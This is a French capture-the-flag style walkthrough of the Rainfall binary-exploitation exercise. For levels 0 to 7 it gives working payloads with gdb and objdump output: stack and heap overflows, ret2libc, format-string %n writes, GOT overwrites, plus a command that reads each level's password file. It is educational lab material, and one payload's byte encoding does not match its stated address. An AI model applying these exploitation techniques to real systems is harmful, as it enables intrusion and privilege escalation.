# Rainfall — Notes d'exploitation (version propre)

> Document de travail pour nous deux.  
> Objectif : aller droit au but niveau par niveau, avec **faille**, **spoiler**, puis **solution**.

---

## Règle générale (flags)

Quand tu obtiens un shell via la faille :

1. Vérifie l'utilisateur courant :

```bash
whoami
```

2. Récupère le mot de passe du niveau :

```bash
cat /home/user/levelX/.pass
```

---

## Level0

- **Type de faille** : validation d'argument faible (pas un BOF complexe).
- **Idée** : en décompilant l'ELF, on voit qu'un argument numérique permet d'ouvrir un shell.

<details>
<summary>Spoiler</summary>

Le programme vérifie l'argument ; si c'est la bonne valeur numérique, il déclenche le shell.

</details>

### Solution

```bash
./level0 423
```

---

## Level1

- **Type de faille** : Stack-Based Buffer Overflow (basique).
- **Contexte** : `main` lit avec `gets` dans un buffer de 76 chars, et une fonction `run` existe mais n'est jamais appelée.

<details>
<summary>Spoiler</summary>

1. Récupérer l'adresse de `run` :

```bash
objdump -d -M intel level1 | grep run
# 08048444 <run>:
```

2. Écraser l'adresse de retour avec cette adresse (en little-endian).  
   `0x08048444` devient `\x44\x84\x04\x08`.

</details>

### Solution

```bash
(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

---

## Level2

- **Type de faille** : Stack-Based BOF + Ret2libc.
- **Contexte** : la fonction `p()` utilise `gets` (pas de limite de taille).

Ret2libc = réutiliser des fonctions déjà chargées (ex: `system`, `exit`) pour exécuter `/bin/sh`.

<details>
<summary>Spoiler</summary>

### 1) Trouver l'offset

Dans `gdb ./level2`, envoyer un pattern cyclique, puis analyser l'adresse du segfault :

- Segfault : `0x37634136`
- **Offset = 80**

### 2) Récupérer les adresses utiles

```gdb
p system
# 0xb7e6b060

p exit
# 0xb7e5ebe0
```

### 3) Trouver `/bin/sh` dans libc

```gdb
info proc map
```

Extrait utile :

```gdb
0xb7e2c000 0xb7fcf000 ... /lib/i386-linux-gnu/libc-2.15.so
```

Chercher la chaîne :

```gdb
find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
# 0xb7f8cc58
```

### 4) Prendre une adresse de retour “propre”

```gdb
disass main
```

Le `ret` de fin est à `0x0804854b`.

### 5) Ordre du payload

`[offset 80] + [ret main] + [system] + [exit] + [/bin/sh]`

Soit :

- `0x0804854b`
- `0xb7e6b060`
- `0xb7e5ebe0`
- `0xb7f8cc58`

</details>

### Solution

```bash
(python -c 'print "a" * 80 + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\x5e\x7e" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
```

---

## Level3

- **Type de faille** : Format String Vulnerability (`printf(user_input)` en brut).
- **Objectif** : modifier la variable globale `m` pour atteindre la valeur attendue.

Exemple de fuite :

```bash
./level3
%p
# 0x200
```

<details>
<summary>Spoiler</summary>

### 1) Trouver la position de notre entrée sur la pile

```bash
./level3
AAAA %p %p %p %p %p %p
# AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 ...
```

`0x41414141` (= `AAAA`) apparaît au **4e argument**.

### 2) Identifier l'adresse de `m`

```gdb
disass v
```

La zone intéressante montre :

```gdb
0x080484da <+54>: mov    0x804988c,%eax
```

Validation :

```gdb
x/s 0x804988c
# 0x804988c <m>: ""
```

### 3) Utiliser `%n`

- `%n` écrit le nombre de caractères déjà imprimés à l'adresse fournie.
- Ici `m` doit valoir `64`.
- On met l'adresse de `m` (4 octets), puis 60 chars, puis `%4$n`  
  => `4 + 60 = 64`.

</details>

### Solution

```bash
(python -c 'print "\x8c\x98\x04\x08" + "a" * 60 + "%4$n"'; cat) | ./level3
```

---

## Level4

- **Type de faille** : Format String Vulnerability - 2nd method (using %x and spaces)
- **Objectif** : modifier la variable globale `m` pour atteindre la valeur attendue.


<details>
<summary>Spoiler</summary>

### 1) Trouver la position de notre entrée sur la pile

```bash
./level4 
AAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p
AAAA 0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025

```

`0x41414141` (= `AAAA`) apparaît au **12e argument**.

### 2) Identifier l'adresse de `m`

```gdb
disass n
```

La zone intéressante montre : 0x8049810

```gdb
0x0804848d <+54>:	mov    0x8049810,%eax
```

Validation :

```gdb
x/s 0x8049810
0x8049810 <m>:	 ""
```

### 3) Utiliser `%n`

- `%n` écrit le nombre de caractères déjà imprimés à l'adresse fournie.
- Ici `m` doit valoir `0x1025544` soit `16930116`.
- On met l'adresse de `m` (4 octets), puis 16930112 chars, puis `%12$n`  
  => `4 + 16930112 = 16930116`.

- Hors python ne peut pas imprimer autant. Donc on passe par printf
  => `%16930112s`

</details>

### Solution

```bash
(python -c 'print "\x10\x98\x04\x08" + "%16930112s" + "%12$n"'; cat) | ./level4 
```

---



## Level5

- **Type de faille** : Format String Vulnerability - PLT overwriting
- **Idee** : On a un `fgets` mais limite. Il y a une focntion `o()`. On va donc utiliser la GOT et l'overwrite pour remplacer une fonction got.plt par `o()`


<details>
<summary>Spoiler</summary>

### 1) Trouver la position de notre entrée sur la pile

```bash
./level5 
AAA %p %p %p %p %p %p %p %p
AAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x20414141 0x25207025 0x70252070 0x20702520 0x25207025

```

`0x20414141` (= `AAA`) apparaît au **4e argument**.

### 2) Identifier l'adresse de `exit()` pour la remplacer par la fonction `o()`

```gdb
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:	jmp    *0x8049838
   0x080483d6 <+6>:	push   $0x28
   0x080483db <+11>:	jmp    0x8048370
End of assembler dump.
(gdb) 

```

La zone intéressante montre : 0x8049838

```gdb
(gdb) disass 0x8049838
Dump of assembler code for function exit@got.plt:
   0x08049838 <+0>:	(bad)  
   0x08049839 <+1>:	addl   $0xffffffe6,(%eax,%ecx,1)
End of assembler dump.
(gdb) 
```

L'addresse qu'on va remplacer est **0x08049838**

### 3) Trouver l'address de `o()`

```gdb
(gdb) p o
$1 = {<text variable, no debug info>} 0x80484a4 <o>
(gdb) 
```

### 4) Preparer le payload

- Premierement on met notre address de `exit@got.plt` ==> **\x38\x98\x04\x08**
- Deuxiemement on y rajoute l'address de `o()`. Mais cette fois-ci vu que c'est de l'overwrite, on va la mettre via printf. On converti donc en decimal : **134513824** ==> `"%134513824x"`
- Enfin on y met notre fameux `"%4$n"`

</details>

### Solution

```bash
(python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"'; cat) | ./level5 
```

---

## Level6

- **Type de faille** : Heap-Based Buffer Overflow - Basic
- **Objectif** : Le `main()` utilise une fonction `m()`, qui ne fait rien mais il y a une fonction `n()` qui ouvre un shell -> Remplacer l'appel de `m()` par `n()`


<details>
<summary>Spoiler</summary>

### 1) Trouver l'offset

Dans `gdb ./level6`, envoyer un pattern cyclique, puis analyser l'adresse du segfault :

- Segfault : `0x41346341`
- **Offset = 72**

### 2) Identifier l'adresse de `n()`

```gdb
(gdb) print n
$1 = {<text variable, no debug info>} 0x8048454 <n>
(gdb)
```

### 3) Preparer le payload

- Premierement on met notre offset  ==> **72 fois**
- Puis on y rajoute l'address de `n()` ==> `\x54\x84\x04\x08`

</details>

### Solution

```bash
./level6 $(python -c 'print "a" * 72 + "\x54\x84\x04\x08"')

```

---

## Level7

- **Type de faille** : Heap-Based Buffer Overflow - PLT overwriting
- **Idee** : On combine l'overwrite qu'on a appris avec la string vulnerability et le heap overflow. donc remplacer `puts()` par `m()`

<details>
<summary>Spoiler</summary>

### 1) Trouver l'offset


offset=adresse_cible−adresse_debut_buffer
Dans ce code précis
Ordre des allocations :

a = malloc(sizeof(Item))
a->data = malloc(8)
b = malloc(sizeof(Item))
b->data = malloc(8)
Sur un binaire 32-bit typique :

sizeof(Item) = 8
un malloc(8) occupe en général un chunk de 0x10 octets
donc a->data et b seront souvent séparés de 0x10
Donc :

offset jusqu’à b->type : 16 octets
offset jusqu’à b->data : 20 octets


Donc offset a 20 car on veut ecraser b->data

### 2) Identifier l'adresse de `puts()` et de `m()`

```gdb
(gdb) disass puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    *0x8049928
   0x08048406 <+6>:	push   $0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) disass 0x8049928
Dump of assembler code for function puts@got.plt:
   0x08049928 <+0>:	push   %es
   0x08049929 <+1>:	test   %al,(%eax,%ecx,1)
End of assembler dump.
(gdb) 

```

```gdb
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
(gdb) 
```



### 3) Preparer le payload

- Premier argument : offset + address de `puts@got.plt`
- Deuxieme argument : address de `m()`

</details>

### Solution

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
```

---



## Level8

- **Type de faille** : Breach Exploitation and Memory Manipulation by understanding a decompiled program

## Level9

- **Type de faille** : Shellcode Injection and Memory Manipulation of a binary programmed in C++



TODO (à compléter)

Ressource utile pour générer un pattern d'overflow :  
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

GOT
https://en.wikipedia.org/wiki/Global_Offset_Table

PLT
https://maskray.me/blog/2021-09-19-all-about-procedure-linkage-table